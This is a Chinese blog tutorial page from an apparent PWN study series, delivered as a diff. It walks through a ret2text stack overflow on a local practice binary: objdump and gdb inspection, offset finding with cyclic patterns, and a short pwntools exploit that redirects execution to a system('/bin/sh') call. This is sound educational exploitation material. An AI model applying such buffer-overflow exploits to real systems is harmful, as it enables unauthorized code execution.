@@ -1,0 +1,617 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>09第9节.Rop-Ret2Text实例详解 | 乙太</title><meta name="author" content="乙太"><meta name="copyright" content="乙太"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.快速确定偏移地址-复习上节 pwdbg: cyclic 200 cyclic  -l 地址 peda: pattern create 200 pattern offset 地址 不同插件有所差异吧： 查看汇编代码 objdump -t xxx 查看程序中使用到的函数 objdump -d xxx 查看程序中函数的汇编代码 objdump -d -j.plt xxx 查看plt表     -j的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="09第9节.Rop-Ret2Text实例详解">
+<meta property="og:url" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="乙太">
+<meta property="og:description" content="一.快速确定偏移地址-复习上节 pwdbg: cyclic 200 cyclic  -l 地址 peda: pattern create 200 pattern offset 地址 不同插件有所差异吧： 查看汇编代码 objdump -t xxx 查看程序中使用到的函数 objdump -d xxx 查看程序中函数的汇编代码 objdump -d -j.plt xxx 查看plt表     -j的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg">
+<meta property="article:published_time" content="2026-05-27T16:34:48.000Z">
+<meta property="article:modified_time" content="2026-05-27T17:42:49.834Z">
+<meta property="article:author" content="乙太">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "09第9节.Rop-Ret2Text实例详解",
+  "url": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/",
+  "image": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg",
+  "datePublished": "2026-05-27T16:34:48.000Z",
+  "dateModified": "2026-05-27T17:42:49.834Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "乙太",
+      "url": "https://blog.oisec.cn"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":2,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '09第9节.Rop-Ret2Text实例详解',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/github-chart.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="乙太" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/toux.jpg" alt="Logo"><span class="site-name">乙太</span></a><a class="nav-page-title" href="/"><span class="site-name">09第9节.Rop-Ret2Text实例详解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">09第9节.Rop-Ret2Text实例详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-27T16:34:48.000Z" title="发表于 2026-05-28 00:34:48">2026-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T17:42:49.834Z" title="更新于 2026-05-28 01:42:49">2026-05-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/">逆向</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/PWN/">PWN</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong>一.快速确定偏移地址-复习上节</strong></p>
+<p>pwdbg:</p>
+<p>cyclic 200</p>
+<p>cyclic  -l 地址</p>
+<p>peda:</p>
+<p>pattern create 200</p>
+<p>pattern offset 地址</p>
+<p>不同插件有所差异吧：</p>
+<p>查看汇编代码</p>
+<p>objdump -t xxx 查看程序中使用到的函数</p>
+<p>objdump -d xxx 查看程序中函数的汇编代码</p>
+<p>objdump -d -j.plt xxx 查看plt表</p>
+<p>    -j的参数有： .text  - 代码段</p>
+<p>          .const- 只读数据段（有些编译器不使用此段，将只读数据并入.data段）</p>
+<p>          .data - 读写数据段    </p>
+<p>          .bss - bss段</p>
+<p>objdump -d -M intel xxx 查看程序中函数的汇编代码，并且汇编代码是intel架构的</p>
+<p><strong>二.实例程序</strong></p>
+<p>不知道源码，命令：file ret2text      查看文件类型</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg" alt="wps129"> </p>
+<p>可以看到是32位的intel架构可执行可执行文件</p>
+<p>查看函数：objdump -t ret2text</p>
+<p>查看汇编代码：objdump -d -M intel ret2text</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps130.jpg" alt="wps130"> </p>
+<p>先看到main函数吧，可以找到一个关键函数gets。</p>
+<p>查找系统函数：objdump -d -M intel ret2text |grep system</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps131.jpg" alt="wps131"> </p>
+<p>可以看到它的地址：8048641</p>
+<p>查看可以看到它属于一个secure函数内部：</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps132.jpg" alt="wps132"> </p>
+<p>但是此时我们还要看它的参数是啥：</p>
+<p>其实就在上一行，地址0x8048763传入esp</p>
+<p>查看该地址参数内容：先运行gdb，后输入：x&#x2F;s 0x8048763</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps133.jpg" alt="wps133"> </p>
+<p>可见这个参数是很重要的，所以我们的定位点应该先在传入参数这一行，然后才是调用系统函数！</p>
+<p>接下来再查看偏移，和上节讲的操作方法一样：</p>
+<p>先生成字符串，后运行复制粘贴：</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps134.jpg" alt="wps134"> </p>
+<p>此时报出地址：</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps135.jpg" alt="wps135"> </p>
+<p>查看偏移：pattern offset 0x38414169</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps136.jpg" alt="wps136"> </p>
+<p>有个问题？为什么我的偏移少了1呢？</p>
+<p>其实这里要注意一个细节就是，复制粘贴随机生成的字符串的时候不能是选到前后两端的单引号(  ‘  )</p>
+<p>修复过后，偏移地址应该是112，上节笔记应该也加1！</p>
+<p>此时我们再来写exp:</p>
+<p>from pwn import *</p>
+<p>p &#x3D; process(“.&#x2F;ret2text”)</p>
+<p>offset &#x3D; 112</p>
+<p>paload &#x3D; offset*”A”+p32(0x804863a)#这是传入binsh传参的指令的地址</p>
+<p>p.sendline(paload)</p>
+<p>p.interactive()</p>
+<p>ps: 其实这里应该注意一个栈对其问题，由于堆栈的一个压栈出栈的操作，所以导致ESP最后一位应该必定是0，4，8，在64位程序中，RSP最后一位就必定是0，8。在unbuntu18之后增加栈对其机制，如果在执行system函数的时候检测到ESP末位不是0那么就判断程序被劫持了然后停止执行。</p>
+<p>下面这个一般就是栈对齐错误</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps137.jpg" alt="wps137"> </p>
+<p>所以这里的exp构造的payload的时候应该动态调试注意一下。</p>
+<p>栈对齐错误总结：遇到要使用system函数payload就加上p64(ret)</p>
+<p>运行exp：python2 expret2text.py</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps138.jpg" alt="wps138"> </p>
+<p>成功获取！</p>
+</article><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/%E9%80%86%E5%90%91/PWN/09%E7%AC%AC9%E8%8A%82.Rop-Ret2Text%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3/wps129.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>如果这篇文章帮到了你，可以请我喝杯咖啡。</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/images/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/%E9%80%86%E5%90%91/PWN/10%E7%AC%AC10%E8%8A%82.%E4%BD%BF%E7%94%A8gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%9564%E4%BD%8D%E7%A8%8B%E5%BA%8F/" title="10第10节.使用gdb附加调试64位程序"><img class="cover" src="/%E9%80%86%E5%90%91/PWN/10%E7%AC%AC10%E8%8A%82.%E4%BD%BF%E7%94%A8gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%9564%E4%BD%8D%E7%A8%8B%E5%BA%8F/wps139.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">10第10节.使用gdb附加调试64位程序</div></div><div class="info-2"><div class="info-item-1">一.开发脚本时如何调试 对于elf文件来说，可能有时需要我们进行一些动态调试工作，这个时候就需要用到gdb，pwntools的gdb也提供了这方面的支持。 其中最常用的还是attach函数，在指定process之后可以attach上去调试，配合proc模块就可以得到对应进程的pid非常方便。 pwntools开发脚本时如何调试：  使用proc.pidof(p)函数先将被测函数的PID打印出来；  用GDB Attach上去调试即可。  l 二.实例程序test.c 源代码： #include&lt;stdio.h&gt; void exploit() {                system(“&#x2F;bin&#x2F;sh”); }        void main() {                char buf[20];         gets(buf); } 编译64位程序，关闭保护：gcc -no-pie -fno-stack-protector -z execstack -m64 -o test test.c   查看保护：checksec tes...</div></div></div></a><a class="pagination-related" href="/%E9%80%86%E5%90%91/PWN/08%E7%AC%AC8%E8%8A%82.ROP-Ret2Text%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8F%92%E4%BB%B6%E9%85%8D%E7%BD%AE-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="08第8节.ROP-Ret2Text介绍以及插件配置-基础知识"><img class="cover" src="/%E9%80%86%E5%90%91/PWN/08%E7%AC%AC8%E8%8A%82.ROP-Ret2Text%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8F%92%E4%BB%B6%E9%85%8D%E7%BD%AE-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/wps121.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">08第8节.ROP-Ret2Text介绍以及插件配置-基础知识</div></div><div class="info-2"><div class="info-item-1">一.ROP系统攻击 简介 ROP攻击同缓冲区溢出攻击，格式化字符串漏洞攻击不同，是一种全新的攻击方式,它利用代码复用技术。   核心思想 ROP的核心思想：攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。操作系统通过栈来进行函数的调用和返回。函数的调用和返回就是通过压栈和出栈来实现的。每个程序都会维护一个程序运行栈，栈为所有函数共享，每次函数调用，系统会分配一个栈桢给当前被调用函数，用于参数的传递、局部变量的维护、返回地址的填入等。栈帧是程序运行栈的一部分 ，在Linux中 ，通过%esp和 %ebp寄存器维护栈顶指针和栈帧的起始地址 ，%eip是程序计数器寄存器。 而ROP攻击则是利用以ret结尾的程序片段 ，操作这些栈相关寄存器，控制程序的流程，执行相应的gadget，实施攻击者预设目标 。ROP不同于retum-to-libc攻击之处在于，ROP攻击以ret指令结尾的函数代码片段 ，而不是整个函数本身去完成预定的操作。从广义角度讲 ，return-to-libc攻击是R...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">乙太</div><div class="author-info-description">道也者，至精也，不可为形，不可为名，强为之名，谓之乙太。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/unique-Elven"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/unique-Elven" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/2098810443" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #00a1d6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">期待各位给这篇博客项目点点 star：<a target="_blank" rel="noopener" href="https://github.com/unique-Elven/unique-Elven.github.io">unique-Elven.github.io</a><br>如果有问题可以反馈到项目里，持续改进，知识共享。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%AE%80%E5%8E%86/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" title="渗透测试面试问题">渗透测试面试问题</a><time datetime="2026-05-27T17:42:48.000Z" title="发表于 2026-05-28 01:42:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/OSCP%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83(hackmyvm)/gigachad%20-%20suid/" title="gigachad - suid">gigachad - suid</a><time datetime="2026-05-27T17:41:48.000Z" title="发表于 2026-05-28 01:41:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96%E7%BB%B4%E5%BA%A6%E5%8E%9F%E7%90%86/" title="特征提取维度原理">特征提取维度原理</a><time datetime="2026-05-27T17:40:48.000Z" title="发表于 2026-05-28 01:40:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/AI/LightBGM/Day%201.LightGBM%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/" title="Day 1.LightGBM算法基本原理">Day 1.LightGBM算法基本原理</a><time datetime="2026-05-27T17:39:48.000Z" title="发表于 2026-05-28 01:39:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/01%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%87%86%E5%A4%87/" title="01环境安装准备">01环境安装准备</a><time datetime="2026-05-27T17:38:48.000Z" title="发表于 2026-05-28 01:38:48">2026-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 乙太</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
